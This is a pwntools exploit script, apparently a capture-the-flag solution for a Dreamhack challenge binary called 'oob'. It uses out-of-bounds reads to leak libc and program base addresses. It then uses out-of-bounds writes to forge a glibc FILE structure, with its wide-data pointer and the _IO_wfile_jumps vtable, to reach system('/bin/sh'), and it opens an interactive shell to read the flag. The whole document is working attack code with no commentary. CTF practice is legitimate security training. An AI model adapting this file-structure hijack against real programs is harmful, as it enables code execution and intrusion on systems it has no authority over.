#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 17873
HOST = "host8.dreamhack.games"
exe = context.binary = ELF('./oob_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            brva 0x00000000000012fd
            brva 0x000000000000139A
            brva 0x0000000000001242
            b* _IO_wfile_overflow
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def show(offset):
    p.sendlineafter(b'> ', str(1))
    p.sendlineafter(b'offset: ', str(offset))

def add(offset, data):
    p.sendlineafter(b'> ', str(2))
    p.sendlineafter(b'offset: ', str(offset))
    p.sendlineafter(b'value: ', str(data))

# VARIABLE


# PAYLOAD
leaks = []
for i in range(6):
    show(16 + i)
    b = p.recv(1)
    leaks.append(b)
libc_leak_bytes = b''.join(leaks)
libc_leak = u64(libc_leak_bytes.ljust(8, b'\0'))
libc.address = libc_leak - libc.sym._IO_2_1_stdout_
log.info("Libc base: " + hex(libc.address))
system = libc.sym.system
io_wfile_jumps = libc.sym._IO_wfile_jumps
io_file_jumps = libc.sym._IO_file_jumps

leak1 = []
for i in range(6):
    show(-8 + i)
    b = p.recv(1)
    leak1.append(b)
exe_leak_bytes = b''.join(leak1)
exe_leak = u64(exe_leak_bytes.ljust(8, b'\0'))
exe.address = exe_leak - 0x4008
log.info("Exe base: " + hex(exe.address))
main = exe.sym.main
rw_section = exe.address + 0x4800

add(0x40, system)
add(0x8d0, exe.address + 0x3fe8)
add(0x68, 0x732f6e69622f2020)
add(0x70, 104)
add(0xf0, rw_section) # lock
add(0x108, rw_section) # _wide_data
add(0x140, io_wfile_jumps) # vtable
# GDB()
add(0x10, exe.address + 0x4078)
p.sendline(b'cat flag')

p.interactive()